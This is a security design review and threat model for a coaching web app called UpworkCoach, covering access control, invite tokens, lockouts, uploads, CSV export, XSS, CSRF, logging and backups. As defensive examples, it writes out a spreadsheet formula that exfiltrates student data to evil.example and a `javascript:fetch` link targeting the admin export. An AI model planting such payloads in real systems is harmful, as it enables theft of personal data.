# Security — UpworkCoach v0.1 ("Coach Office")

> Phase 3 (design review before coding) — 27 Mehr 1405 (2026-10-19) — author: security-reviewer
> Inputs: `CLAUDE.md`, `STATUS.md`, `02-product/prd.md` (sections 5, 6, 8, F1, F2, F5, F11), `overview.md`, `tech-stack.md`, `data-model.md`, `api.md`, ADR-0002, ADR-0003, ADR-0004, ADR-0007, ADR-0008, `03-ux/sitemap.md`
> Scope: the 0.1 design only. **AI, payments and OTP are not in 0.1** and are only mentioned here (section 9).
> Method: document review only. No tests were run against a live environment.

---

## 0. Summary

### What the current design gets right
The design has a solid foundation: database-backed sessions with immediate revocation, only SHA-256 token hashes stored in the database, argon2id, a `__Host-` cookie with `HttpOnly`, an identical response for login failures (using a dummy hash), `Origin` checks, `404` instead of `403` for out-of-scope resources, a separate DTO for students, a canary test, a single function for reading notes on the student path, image re-encoding with sharp, attachments served from our own server, and no field at all for platform account passwords.

### The five most important risks
| # | Risk | Severity | Section |
|---|---|---|---|
| R1 | **Leak of identity data that links a student to their Upwork account** (name + mobile + profile link + contract screenshot). Upwork blocks Iranian users (`risks.md` R4), so a leak of this data (through an IDOR, a CSV export or a backup) could destroy the accounts of several students at once | High | 2, 3-2, 3-4, 7 |
| R2 | **Cross-role access through IDs inside the request body** (`attachmentIds`, `profileId`, `taskId`, `reviewerId`, ...). The design checks the scope of the primary resource but has no rule for referenced IDs. One dangerous example: a mentor could use `POST /users/:id/invite-link` to create an invite link for **an admin who has not yet been invited**, and become admin | High | 3-2, C3 |
| R3 | **Leak of an invite or reset link** (the token is in the URL path, so it stays in the host's HTTP logs and the browser history, and gets forwarded on Telegram). Whoever holds the link owns the account, and for an admin's reset link that means owning the whole system | High | 3-1, C1 |
| R4 | **Deliberate lockout of the admin account** (5 wrong attempts per mobile number, from any IP). The coach's mobile number is public, so anyone can keep the coach locked out indefinitely. It is also unclear how the IP is read from `X-Forwarded-For`, and if the first value is read, the IP lockout can be bypassed | Medium | 3-1, C2 |
| R5 | **No retention and account-deletion policy**, although the PRD requires "the ability to delete an account" and screen S10 has a "Request account deletion" button with no API or process behind it. Real data of 80 people enters from day one and is also replicated into two backups (Azure and inside Iran) | Medium | 7, C5 |

### Design changes required before coding (details in section 4)
| Code | Change | Where | Blocks the start of coding? |
|---|---|---|---|
| C1 | Move the invite and reset tokens from the URL path to a fragment and the POST body; confirm invite acceptance by entering the mobile number | ADR-0003 sections 1-2 and 7, `api.md` section 2, `sitemap.md` G2/G3 | Yes, for the `identity` module |
| C2 | Base the login lockout on "mobile + IP", and make sure the global mobile lockout does not lock out known devices; specify the rule for reading the IP behind the proxy; shorten the staff session lifetime; normalize passwords | ADR-0003 sections 3-5, `data-model.md` (`auth_throttle`) | Yes, for the `identity` module |
| C3 | A rule for "referenced IDs" and a few missing access rules | ADR-0004 sections 1-2, `api.md` sections 3, 6, 7, 14 | Yes, before the first service |
| C4 | Attachment rule: only a `pending` attachment from the same uploader may be linked; pixel limit and quota | `data-model.md` 2-5 (`attachments`), `api.md` section 14 | Yes, for the `files` module |
| C5 | A `users.erased_at` column, a deletion process (CLI) and a retention policy; resolve the inconsistency of the delete-account button in S10 | `data-model.md` 2-1, `overview.md` section 5, `sitemap.md` S10 | No for starting; yes before real data enters |
| C6 | Bulk import in 0.1 is CSV only (no XLSX) | `api.md` section 13 | No; before building bulk import |
| C7 | Document consistency: `SESSION_SECRET` is in ADR-0002 but not in the env contract; `tech-stack.md` section 4 still mentions `docker compose` for the local environment | ADR-0002 section 6, `tech-stack.md` sections 4 and 5 | No |
| C8 | Do not open the database with "Allow access from any Azure service"; keep backups in a separate storage account that the app cannot delete from | ADR-0002 sections 6-7 (owner: devops-engineer) | No; before deployment |

### Status of the changes (update by software-architect, 28 Mehr 1405 (2026-10-20))
| Code | Status | Where |
|---|---|---|
| C1 | **Applied** | ADR-0003 section 1 (`#t=` link format, one-hour CLI), section 2 (lookup/accept via POST, full mobile number, 5 attempts, atomic consumption) and section 7; `api.md` sections 2 and 3; `data-model.md` 2-1 (`auth_tokens.phone_mismatch_count`, `used_user_agent`); `overview.md` 4-1; `03-ux/sitemap.md` G2, G3 and the tree map |
| C2 | **Applied** | ADR-0003 section 3 (length 12 for staff, deterministic `normalizePassword`), section 4 (`getClientIp` with `TRUSTED_PROXY_HOPS`, three-layer lockout, device cookie, admin recovery CLI), section 5 (staff sessions 7/30 days); `data-model.md` 2-1 (`auth_throttle`, `sessions.expires_at`, `password_hash`); `api.md` section 2 |
| C3 | **Applied** | ADR-0004 section 1-1 (referenced-ID rule and `assertRefs`; uniform `422` error), section 2 (`invite-link` only for `role='student'`, author/reviewer **and** scope, summary only with an open question, sessions), section 4 (roles: former-M, M-assignee, inactive, invited; T-REF and T-ESC); `api.md` sections 1, 3, 4, 6, 7, 8, 10, 12. **Difference from the proposal:** all rejected referenced IDs, including the bulk-task `studentIds`, get `422` (not `404`); `404` is only for the path ID |
| C4 | **Applied** | `data-model.md` 2-5 (`attachments`: processing, pixel limit, rotation and metadata stripping, quota, atomic UPDATE); `api.md` section 14 and the `attachmentIds` inputs in sections 6, 10, 12 |
| C5 | **Applied** | ADR-0010 (new); `data-model.md` 2-1 (`users.erased_at`, mobile CHECK) and section 6 (retention and the anonymization mapping); `api.md` section 3; `overview.md` section 5; ADR-0007 (`auth.cleanup` extended). **S10 decision:** the "Request account deletion" button is removed in 0.1 and replaced with explanatory text (reason in ADR-0010 item 6); the S10 row in `sitemap.md` is to be edited with the ux-designer |
| C6 | **Applied** (update by software-architect, 30 Mehr 1405 (2026-10-22); aligned with the code, sprint 3) | Code: `POST /imports/students` accepts only UTF-8 CSV, 1 MB, 500 rows, `dryRun` by default. Document: `api.md` section 13 |
| C7 | **Applied** (update by software-architect, 30 Mehr 1405 (2026-10-22); aligned with the code, sprint 1) | `tech-stack.md` section 5 and `.env.example` (`DEVICE_COOKIE_SECRET`, `TRUSTED_PROXY_HOPS`, `JOB_TRIGGER_SECRET`); ADR-0002 section 6 (`SESSION_SECRET` removed). Running the security tests in CI against a real Postgres is with the devops-engineer |

| C8 | **Not applied — must be done before deployment** | ADR-0002 sections 6-7 (owner: devops-engineer) |

> **Implementation deviations from this document** (software-architect, 30 Mehr 1405 (2026-10-22)): in several places the code differs from the requirements text of this document. The architectural ruling is in ADR-0003 section 9 and ADR-0004 section 6, and the security-reviewer's approval or rejection is tracked in `docs/05-delivery/followups.md` (F-07 and the "High" items). The software-architect did not change the requirements text of this document.
>
> **security-reviewer ruling (F-07, 29 Mehr 1405 (2026-10-21)):** all deviations are acceptable, and two of them carry conditions. Details in `docs/06-quality/security-review-2026-10-21.md`. The text of SEC-S1, SEC-C3, SEC-R6 and SEC-U6 in section 5 was corrected to match the code. New findings from the code review: F-17, F-18 and F-19.

---

## 1. Scope, assumptions and attackers

**Assumptions:** 1 admin (the founder), 2 to 4 mentors, 30 to 80 students (A1); one developer; Next.js App Router + Route Handler + RSC; Postgres; Azure App Service B1 (1 core, about 1.75 GB memory); most users on phones with poor internet, and many behind a VPN or an operator NAT.

| Code | Attacker | What they have | What they want |
|---|---|---|---|
| X1 | External, anonymous | The internet, lists of leaked mobile numbers (large Iranian data leaks), lists of leaked passwords | Log in to an account, especially the admin account |
| X2 | Curious or malicious student | A valid student session, the browser developer tools | See the internal notes and health status about themselves, other students' data, XSS against the coach |
| X3 | Out-of-scope mentor or former mentor | A mentor session, IDs seen earlier | View or change another mentor's student, escalate to admin |
| X4 | Someone with access to a link, a log or a phone | A link forwarded on Telegram, the HTTP log, the coach's unlocked phone | Take over an account |
| X5 | Someone with access to the infrastructure or a backup | The storage key, a backup file, the developer's laptop | All the data |

---

## 2. Sensitive data and classification

| Level | Meaning |
|---|---|
| **Class 3 — highly sensitive** | A leak causes direct, irreparable harm (account takeover, a platform account being blocked, exposure of private life) |
| **Class 2 — sensitive** | Personal or business data that must not leave the system |
| **Class 1 — internal** | Configuration and non-personal data |

| Data | Location | Level | Who sees it | Note |
|---|---|---|---|---|
| Password hash, session and invite token hashes | `users.password_hash`, `sessions`, `auth_tokens` | Class 3 | No one through the API | Must never appear in a DTO, RSC props, logs or CSV |
| Invite and reset links (raw token) | Only in a one-time response and a Telegram message | Class 3 | The creating admin/mentor | C1 |
| **Link between a real identity and a platform account**: name + mobile + `platform_profiles.public_url` + screenshots | `users`, `platform_profiles`, `attachments` | **Class 3** | Staff in scope, the student themselves | Because of R4 in `risks.md`: a leaked list of "these Iranians have these Upwork accounts" could lead to mass blocking |
| Internal notes, flags (`financial`, `personal`), health status and reasons | `notes(internal)`, `student_flags`, `student_health` | Class 3 | Staff in scope; **never the student** | May record financial, family or mental state |
| Student income | `milestones.amount`, `students.income_goal_usd`, contract evidence | Class 2 | Staff in scope, the student themselves | A contract screenshot may also show the client's name |
| Mobile number, Telegram ID | `users.phone`, `students.messenger_handle`, `search_text` | Class 2 | Staff in scope, the user themselves | Forbidden in logs (SEC-L) |
| Proposals and job post text (clients' information) | `submissions.*_text` | Class 2 | Staff in scope, the student themselves | With `ai_use_consent` consent for the AI build in 1.0 |
| IP and User-Agent | `sessions`, `audit_log` | Class 2 | The user themselves (their devices), the admin (audit) | Limited retention (section 7) |
| CSV export file | The admin's laptop | Class 3 | Admin | Outside our control; minimal columns (SEC-V) |
| `pg_dump` backup | Azure + the destination inside Iran | Class 3 | Only the holder of the `age` key | The private key is kept outside Azure (SEC-K) |
| Settings, stages, platforms | `settings`, `stages`, ... | Class 1 | — | — |

---

## 3. Threat model (STRIDE)

STRIDE letters: **S** spoofing, **T** tampering, **R** repudiation, **I** information disclosure, **D** denial of service, **E** elevation of privilege.
Severity: **Critical** (takeover of the whole system with no preconditions), **High**, **Medium**, **Low**. Severity is judged against the design's current controls, not after the gap is fixed. The "Action" column points to the checklist IDs in section 5.

### 3-1. Invite, mobile + password login, sessions

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| A1 | S | **Password guessing (brute force)** against a specific mobile number, for example the coach's | Medium | 5 failures in 15 minutes per mobile number → lockout; 30 per IP; argon2id | A lockout cannot be bypassed with multiple IPs (good), but this same lockout is the tool for R4 (A3). For staff, the minimum password length is still 8 | C2, SEC-P2, SEC-R1..R6 |
| A2 | S | **Credential stuffing**: the attacker tries "mobile + password" pairs from Iranian data leaks. Since each user is tried only once, the per-mobile lockout has no effect | Medium | IP lockout; a list of 10,000 common passwords | The IP lockout is bypassed with a VPN and many IPs. A list of 10,000 passwords is too small for leaked passwords. There is no alert for "many failures across the whole system" | SEC-P3, SEC-R5, SEC-L6 |
| A3 | D | **Deliberate account lockout**: every 15 minutes the attacker sends 5 wrong passwords for the coach's mobile number. The coach cannot log in, and the only recovery path goes through the admin themselves | Medium | — | The lockout is per mobile number regardless of device. There is no independent recovery path for the sole admin | C2, SEC-R2, SEC-R3, SEC-T7 |
| A4 | S/I | **IP spoofing**: if the code reads the first value of `X-Forwarded-For`, the attacker sends an arbitrary value to bypass the IP lockout, and the fake IP is recorded in `sessions` and `audit_log` | Medium | — | The rule for reading the IP behind the App Service proxy is not defined | C2, SEC-R4 |
| A5 | I | **User enumeration** through differences in the login response or response time | Low | Identical response, dummy hash | If the lockout is counted only for existing mobile numbers, `429` reveals whether a mobile number exists | SEC-R6 |
| A6 | S | **Leaked invite or reset link**: the token is in the path `/invite/<token>`. So it stays (1) in the host's HTTP log and the pino request log, (2) in the browser history and sync, (3) in a forwarded Telegram group or message, and (4) in the `Referer` header if the page has an external link. Whoever opens it before its owner sets a password and takes over the account. If the target is an admin or mentor account, the severity is higher | High | 256 bits, single use, 7 days / 24 hours, invalidated on re-creation, the name is shown | The token is in the URL; there is no second factor for acceptance; the first admin's invite link lives for 7 days | C1, SEC-T1..T7 |
| A7 | S | **Acceptance via a forwarded link without the account owner's knowledge**. The real owner only sees `410` and may not report it | Medium | — | The staff UI does not show "accepted at ... from device ..." | SEC-T5 |
| A8 | S | **Session fixation** | Low | A fresh session on login and acceptance; the `__Host-` prefix prevents cookie injection from a subdomain | Rotating the current session after a password change is not stated explicitly | SEC-S4 |
| A9 | S/E | **Theft of a staff session** (the coach's unlocked phone, a shared device). The admin session is 30 days sliding and 90 days absolute, and there is no two-step login | Medium | Revocation from "My devices"; `HttpOnly` | The staff session lifetime is the same as the student's. The riskiest action (exporting all students as CSV) does not require re-confirmation | C2, SEC-S2, SEC-S7 |
| A10 | D | **Taking the server down with argon2**: each hash takes about 19 MB of memory. 80 concurrent login requests (even with non-existent mobile numbers, since the dummy hash is also computed) need about 1.5 GB of memory and take down the B1 | Medium | — | A concurrency limit on hashing | SEC-P5 |
| A11 | I | **Leak of the password hash to the browser**: an RSC passes an entire `users` row to a client component and `password_hash` is serialized into the page payload | Medium | DTOs | There is no rule for "explicit column selection" in the repo; the canary test does not look for the hash | SEC-A9, T-CANARY |
| A12 | R | A user denies having seen or done a reset link or a role change | Low | `audit_log` for sensitive actions | Re-creating an invite link (also by a mentor), changing a note's `visibility`, account lockout and account deletion are not logged | SEC-L7 |

### 3-2. Cross-role access (IDOR and privilege escalation)

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| B1 | I | **A mentor accessing another mentor's student** through a single-resource ID (`/tasks/:id`, `/notes/:id`, `/profiles/:id`, `/questions/:id`, `/reminders/:id`, `/flags/:id/clear`, `/milestones/:id/*`, `/submissions/:id/review`, `/attachments/:id`) | High | `staffStudentScope`; `404`; test matrix | The design is right; the risk is in the implementation. Every service must find `student_id` from the parent, and for two-level resources (`reviews` ← `submissions` ← `tasks`) this is easy to forget | SEC-A1, SEC-A2, matrix |
| B2 | E/T | **Referenced IDs in the body**: a mentor creates a task for their own student with another student's `profileId`. On submission, `profile_snapshot` is written onto that student's profile. Or a student sends `POST /me/questions {taskId: <another student's task>}` and that task's title is shown in their string. Or `mentorId`, `reviewerId`, `assigneeId` and `ownerId` point to a student's ID | High | — | ADR-0004 checks scope only for the primary resource. It has no rule for referenced IDs | C3, SEC-A3 |
| B3 | I/T | **Hijacking an attachment**: a user sends another attachment's `attachmentIds` in their own submission or message. The attachment gets linked to the new parent, and they gain "parent access" to it (or the attachment is detached from its owner's submission). Real scenario: a former mentor who saw the IDs earlier links them, after a mentor change, to a question of one of their own students and regains access to the files. UUIDv7 is not guessable, so this scenario only applies to someone who has seen the ID before | Medium | "File access = access to the parent" | The condition `status='pending' AND uploaded_by = actor` is not written for linking | C4, SEC-U9 |
| B4 | **E** | **Mentor → admin**: `POST /users/:id/invite-link` is allowed for a mentor only for "a not-yet-invited student in scope". If the implementation only says "if a `students` row exists, check scope", then for an `invited` user with the `admin` role (who has no `students` row) the scope check is skipped. The mentor creates the admin's invite link, opens it themselves and becomes admin | **High** | Role definition in `api.md` | The condition "`role = 'student'`" is not explicit | C3, SEC-A4, test |
| B5 | I | **A student reaching internal notes or health** through the paths shared by staff and students (`GET /tasks/:id`, `GET /questions/:id`, `/attachments/:id`) that return a different DTO by role. If the role branch is wrong, `StaffTaskDTO` or `studentSummary` reaches the student | High | Separate DTOs, import lint, canary test | The canary test searches only for unique strings, not for extra fields (for example `reviewerId`, `revisionCount`, `studentSummary`) | SEC-A5, T-DTO |
| B6 | I | **Leak through side channels to the student**: `platform_profiles.notes` is visible to the student but a mentor may fill it like an internal note. Changing a note's `visibility` from `internal` to `shared` immediately shows it to the student | Medium | An explanation in `data-model.md` | A "the student sees this" label in the UI and a confirmation for changing visibility are not required | SEC-F6, SEC-L7 |
| B7 | E | **Persistent access after losing scope**: `PATCH /notes/:id` and `DELETE` are allowed for the "author" and `PATCH /reviews/:id` for the "reviewer". A mentor whose student was taken away still reads, edits or makes their notes `shared` | Medium | — | The authorship condition has no scope condition | C3, SEC-A6 |
| B8 | E/T | **Mass assignment**: a student sends `primaryMentorId` or `currentStageId` in `PATCH /me/student`. A mentor sends `primaryMentorId` in `PATCH /students/:id`. A student sends `status: 'approved'` in `POST /me/milestones` | Medium | Whitelist in `data-model.md` 2-3 | The requirement for zod `.strict()` (rejecting unknown keys) is not explicit | SEC-A7 |
| B9 | I | **A mentor responsible for a question, outside their scope**, sees the case summary with `GET /students/:id/summary` even after the question is closed | Low | Limited to `summary` | The condition "an **open** question that they are the assignee of" is not explicit | SEC-A8 |
| B10 | E | **Bypassing access control through middleware or a Server Action**: in 2025 Next.js had a middleware bypass vulnerability (CVE-2025-29927). Server Actions are public endpoints and escape `routes.manifest.ts` and the test matrix | Medium | Access in the service, not in the route (ADR-0004) | A ban on Server Actions and "middleware only for headers" is not explicit | SEC-A10, SEC-A11 |
| B11 | I | `DELETE /auth/sessions/:id` without the condition `user_id = actor` closes another user's session; `GET /auth/sessions` shows other people's IPs | Low | "Only their own sessions" | — (just cover it in tests) | matrix |

### 3-3. File and image upload

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| U1 | T/E | **A fake file** (HTML, SVG or polyglot with `Content-Type: image/png`) served from our domain and executed in the browser (stored XSS) | Medium | Only jpeg/png/webp; re-encoding with sharp; served from the server | Detecting the type from the file content (not the client header) and the download response headers (`nosniff`, a separate CSP) are not explicit | SEC-U1, SEC-U6 |
| U2 | D | **Image decompression bomb**: a 5 MB PNG or WebP with dimensions of 50,000 by 50,000 pixels exhausts sharp's memory and the B1 | Medium | 5 MB limit | Pixel limit; processing concurrency | SEC-U2, SEC-U3 |
| U3 | D | **Buffering a huge body**: the Route Handler in Next.js has no default limit for `request.formData()` and `request.json()`. A 500 MB body is read into memory before the 5 MB check | Medium | `MAX_UPLOAD_BYTES` | Where the limit is enforced (before reading the body) and the JSON body limit are not defined | SEC-U4, SEC-V1 |
| U4 | I | **Image privacy**: GPS and device model in EXIF; a contract screenshot with the client's name | Medium | EXIF stripping | Rotation before stripping EXIF (otherwise the photo ends up sideways and the user re-uploads carelessly); a UI hint to cover the client's name | SEC-U5, SEC-F7 |
| U5 | D | **Filling up storage** with thousands of `pending` attachments | Low | 24-hour cleanup | Per-user quota | SEC-U7 |
| U6 | I | **Direct Blob access**: a public container, or a storage account key with full access in the app settings | Medium | Served from the server (no direct link) | The container access level and the scope of the credential are not defined | SEC-K3 |
| U7 | T | **Image library vulnerability** (libvips inside sharp) | Low | — | Automatic dependency updates | SEC-D1 |

### 3-4. CSV import and export

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| V1 | T/I | **CSV injection in the Excel output**: a student sets `messenger_handle` or `primary_skill` or the milestone evidence text to `=HYPERLINK("https://evil.example/?d="&B2&C2,"details")`. The coach opens `students.csv` in Excel and clicks the cell. The other students' mobile numbers and names go to the attacker's site. Older DDE formulas also run if Excel shows the warning and the user confirms | Medium | Only the admin exports; `audit_log` | Neutralizing cells is not defined | SEC-V2 |
| V2 | I | **A CSV export means all Class 3 data on a laptop**: a stolen admin session or a lost laptop takes out the "name + mobile + Upwork link" list for everyone | Medium | Admin only; audit | Export columns are not defined; no password re-confirmation | SEC-V3, SEC-S7 |
| V3 | T/D | **Malicious input file**: `api.md` mentions import from CSV **and XLSX**. The common npm package `xlsx` (SheetJS) has 0.18.5 as its latest version on npm and has prototype pollution (CVE-2023-30533) and ReDoS (CVE-2024-22363) vulnerabilities whose fixed version was published only outside npm. XLSX is itself a zip (zip bomb) | Low | Admin only; `dryRun` | Format, size limit and row count limit are not defined | C6, SEC-V4 |
| V4 | I | **The bulk import result** is a response with dozens of `inviteUrl`s. If it is logged or cached, dozens of accounts are at risk | Medium | — | `no-store` and a ban on logging the body | SEC-V5, SEC-L1 |

### 3-5. XSS in free-text fields

Free-text inputs from the **student** that are displayed on **staff** pages (the highest-value target: the admin session): `messenger_handle`, `primary_skill`, `goal_90d`, `self_reported_blocker`, profile fields (`public_url`, `headline`, `niche`, `notes`), snapshot text, submission (`body_text`, `links`, `job_post_text`, `proposal_text`, `profile_text`), question (`subject`, `body`, `links`), check-in, `evidence_text`, `attachments.original_name`. Inputs from **staff** that the student sees: shared notes, feedback, task descriptions, stage `content_links`.

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| X1 | E | **A `javascript:` link**: a student puts `javascript:fetch('/api/v1/exports/students.csv').then(…)` in a question's `links`. The coach clicks the "link" and the code runs in the admin session | High | `https://` for profile and submission | The `https://` rule is missing for the `links` of questions and messages, stage `content_links`, and any automatic link-ification in free text | SEC-X2, SEC-X3 |
| X2 | E | **Raw HTML**: the developer uses `dangerouslySetInnerHTML` to "preserve newlines" or "highlight search" | High | React escapes by default | An explicit ban and a lint rule | SEC-X1, SEC-X4 |
| X3 | E | **Injection in `<script>`**: initial data is placed in a `<script>` tag with a hand-written `JSON.stringify`, and `</script>` in a student's name breaks out of it | Medium | — | Ban | SEC-X4 |
| X4 | S | **Text direction deception (bidi)**: a name or link title with the `U+202E` character displays text reversed (for example a fake file name or domain in an RTL interface) | Low | ADR-0008 normalization | Removing directional control characters (not the half-space) | SEC-X5 |
| X5 | E | **No second layer**: if one of the above is missed, nothing stops script execution | Medium | — | CSP is not defined | SEC-H1 |
| X6 | I | **Reverse tabnabbing and Referer**: an external link with `target=_blank` and leakage of an internal path (`/students/<id>`) in `Referer` to the destination site | Low | — | `rel` and `Referrer-Policy` | SEC-X6, SEC-H2 |

### 3-6. CSRF with the session cookie

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| F1 | T/E | An attacker's site sends a `multipart` or `text/plain` form to `POST /api/v1/users/:id/role` (a simple request with no preflight) | Medium | `SameSite=Lax` + `Origin` check + `Content-Type` requirement | Three details: (1) what if `Origin` is absent? (2) compare the origin exactly (scheme + host + port), not with `startsWith`; (3) another subdomain of the same domain (for example a WordPress site at `www.`) is "same-site" and `SameSite` does not stop it. So the `Origin` check is the main defense and must be strict | SEC-C1..C5 |
| F2 | T | A **GET with side effects** (for example `GET /logout` or consuming a token via GET) is triggered from another site under `Lax` | Low | All mutations are non-GET | Link previews in Telegram issue a GET. If a GET consumes the token, the link is invalidated before it reaches the student | SEC-C4, SEC-T3 |
| F3 | T | **Login CSRF**: the attacker logs the victim in with the attacker's own account so the victim enters their data into the attacker's account | Low | `Origin` is also checked on `/auth/login` | — | test |
| F4 | I | **Open CORS**: someone sets `Access-Control-Allow-Origin: *` together with credentials for "mobile testing" | Medium | — | Explicit ban | SEC-C5 |

### 3-7. The internal jobs endpoint and operational paths

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| J1 | S/D | **Empty `JOB_TRIGGER_SECRET`**: if `JOBS_MODE=http-trigger` and the secret is not set, the comparison `undefined === undefined` or `"" === ""` is true and anyone can run `health.sweep` and cleanup without limit | Medium | Only in `http-trigger`; otherwise `404` | "Fail safe" at application start | SEC-J1 |
| J2 | S | **Guessing the secret by response time** (a non-constant-time string comparison) | Low | — | Constant-time comparison | SEC-J2 |
| J3 | T | **Parameters in the body**: if a job reads `studentId` or settings from the body, a leaked secret grants more power | Low | — | Whitelist of names; no parameters | SEC-J3 |
| J4 | I | The public `/healthz` returns more information (database error, connection string) | Low | "No sensitive data" | — | SEC-J4 |
| J5 | E | **Admin bootstrap CLI**: the first admin's invite link is valid for 7 days and stays in the console output. If the sole admin forgets their password or gets locked out, there is no official recovery path and someone manipulates the account with manual SQL in production | Medium | Only when no admin exists | Short expiry; recovery CLI | SEC-T6, SEC-T7 |

### 3-8. Logs and observability

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| L1 | I | **Token in logs**: pino-http logs `req.url` by default and writes `/invite/<token>` or `/api/v1/auth/tokens/<token>` in full. App Service's own HTTP log (if enabled) also keeps the full URL and we cannot mask it | High | "Logs without tokens" (overview) | The token is in the path, so this is only solved by C1 | C1, SEC-L2 |
| L2 | I | **Mobile number in logs**: (1) the search `GET /students?q=0912…` in the URL; (2) a zod error message that returns the input value; (3) a log line "failed login for +98912…"; (4) CSV row errors; (5) Drizzle query logging with parameters; (6) Postgres slow-query logs that also write bind parameters | Medium | "Logs without the request body" | Masking and redaction are not defined | SEC-L1..L5 |
| L3 | I | **Cookies and secrets in logs** (the headers `cookie`, `set-cookie`, `x-job-secret`) | High | — | Redact list | SEC-L1 |
| L4 | R | No alerting on security events (a wave of failed logins, admin account lockout, a CSV export at an unusual hour) | Low | `audit_log` | Alerting | SEC-L6 |

### 3-9. Infrastructure, secrets and backups (summary; owner: devops-engineer)

| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
|---|---|---|---|---|---|---|
| K1 | I | **Database open to "all Azure services"**: the "Allow public access from any Azure service" option on Flexible Server allows connections from the IPs of **any Azure customer**, not just our subscription. So the only barrier is the database password | Medium | — | Network rule | C8, SEC-K2 |
| K2 | T/D | **Backups deleted with the app's credential**: if the backup is in the same storage account as the attachments, then through an application compromise or a leaked key the data and the backup are deleted or encrypted together (ransomware) | Medium | Backups in two places | Separate credentials | C8, SEC-K4 |
| K3 | I | **The `age` private key** next to the backup or in GitHub secrets | High | Encryption with `age` | Where the key lives | SEC-K5 |
| K4 | I | **Real data on the development laptop**: for debugging, a production backup is restored into the local embedded Postgres | Medium | — | Rule | SEC-E2 |
| K5 | E | **Supply chain**: a poisoned package or a critical vulnerability in Next.js/React. In December 2025 a remote code execution vulnerability in React Server Components (CVE-2025-55182) was announced, which also affected the Next.js App Router | High | — | Automatic updates, `audit` blocks merge | SEC-D1..D4 |

---

## 4. Required design changes (before coding)

I did not edit these files myself. The owner of each is the software-architect, unless stated otherwise. The application status of each item is shown under its heading (full table in section 0).

### C1 — Invite and reset tokens outside the path URL; mobile confirmation on acceptance
> **Status:** applied in ADR-0003 (sections 1, 2, 7), `api.md` (sections 2, 3), `data-model.md` 2-1, `overview.md` 4-1 and `sitemap.md` (G2, G3) — 28 Mehr 1405 (2026-10-20).

**Required change in ADR-0003 sections 1-2 and 7, `api.md` sections 2 and 3, `sitemap.md` G2/G3:**
1. Link format: `${APP_BASE_URL}/invite#t=<token>` (and `/reset#t=<token>` for reset). The browser **does not send the fragment to the server**, so the token does not appear in the host's HTTP log, the pino log or `Referer`.
2. The `/invite` page is static. Its JavaScript reads the token from `location.hash`, immediately calls `history.replaceState` to clear it from the address bar and history, and calls the endpoints below:
   - `POST /api/v1/auth/tokens/lookup { token }` ← `{ purpose, displayName, expiresAt }` (instead of `GET /auth/tokens/:token`)
   - `POST /api/v1/auth/tokens/accept { token, phone, password }` (instead of `POST /auth/tokens/:token/accept`)
3. **A cheap second factor:** the acceptance form asks for the **full mobile number** and the server compares it with `users.phone`. Someone who has only the link (forwarded, from a log, from a Telegram group) and does not know the mobile number cannot take the account. 5 wrong mobile numbers for one token ← the token is invalidated and the event is recorded in `audit_log`. For the same reason the lookup page no longer **shows the masked mobile number** (`0912***4567` reveals seven of the eleven digits and brings the guess down to 10 thousand possibilities). The name is enough.
4. A link preview in Telegram is only a GET to the static page; it does not see the token and does not consume it.

### C2 — Lockout policy, IP behind the proxy, staff session lifetime, password normalization
> **Status:** applied in ADR-0003 (sections 3, 4, 5), `data-model.md` 2-1 and `api.md` section 2 — 28 Mehr 1405 (2026-10-20). Password normalization was made deterministic per SEC-P1.

**Required change in ADR-0003 sections 3, 4 and 5, and `data-model.md` 2-1 (`auth_throttle`):**
- Three-layer lockout (details in SEC-R1..R3): (1) "mobile + IP"; (2) a global per-mobile lockout that does **not** lock out a **known device** (device cookie); (3) IP. This needs a new secret (`DEVICE_COOKIE_SECRET`; the same empty slot as `SESSION_SECRET` in ADR-0002).
- The rule for reading the IP behind the proxy (SEC-R4).
- Staff session lifetime: 7 days sliding and a 30-day absolute cap. Students unchanged (30 and 90).
- Minimum staff password length of 12 characters.
- **Password normalization** (SEC-P1): ADR-0003 says Persian digits in a password are not converted. But a password typed on an Android and a Windows keyboard may produce `ي` and `ی` (Arabic and Persian yeh) or different digits, and a user who types the "correct password" gets locked out. The result is more manual resets over Telegram, which is itself a social-engineering channel. This must be decided before the first hash is built, because changing it later invalidates all passwords.

### C3 — Referenced IDs and missing access rules
> **Status:** applied in ADR-0004 (sections 1-1, 2, 4) and `api.md` (sections 1, 3, 4, 6, 7, 8, 10, 12) — 28 Mehr 1405 (2026-10-20). The referenced-ID error is a uniform `422` everywhere.

**Required change in ADR-0004 section 1 (new rule) and section 2 (matrix), and `api.md` sections 3, 6, 7:**
1. **The referenced-ID rule:** every ID that appears in the body or query and points to another resource gets a scope check like the primary resource, and if it depends on a student it must **belong to that same student**:

   | ID | Condition |
   |---|---|
   | `profileId` in a task | `profile.student_id = task.student_id` and not deleted |
   | `taskId` in a question | `task.student_id = thread.student_id` |
   | `attachmentIds` | C4 |
   | `mentorId`, `reviewerId`, `assigneeId`, `ownerId` | An `active` user with the `admin` or `mentor` role. For a mentor actor, `ownerId` can only be themselves |
   | `studentId` in a reminder, `studentIds` in bulk | In `staffStudentScope(actor)` |
   | `stageId`, `platformId`, `templateId`, `typeId`, `cannedResponseId`, `trackId` | Must exist and be active |

   Error: `422 VALIDATION_FAILED` for lists and `404` for an out-of-scope student resource, with no difference in the message.
2. `POST /users/:id/invite-link` for a mentor: **`target.role = 'student'`** and `status = 'invited'` and in scope. For other roles `404`.
3. `PATCH/DELETE /notes/:id` and `PATCH /reviews/:id`: "author **and** in scope", or admin.
4. `GET /students/:id/summary` for an out-of-scope mentor: only if there is an **open** question from this student whose assignee is themselves.
5. The matrix in ADR-0004 section 4 should get two new roles: **former-M** (a mentor before the mentor change) and **M-assignee** (responsible for a question outside their scope), plus a **deactivated user with an old cookie**.

### C4 — Attachment rule
> **Status:** applied in `data-model.md` 2-5 and `api.md` section 14 — 28 Mehr 1405 (2026-10-20).

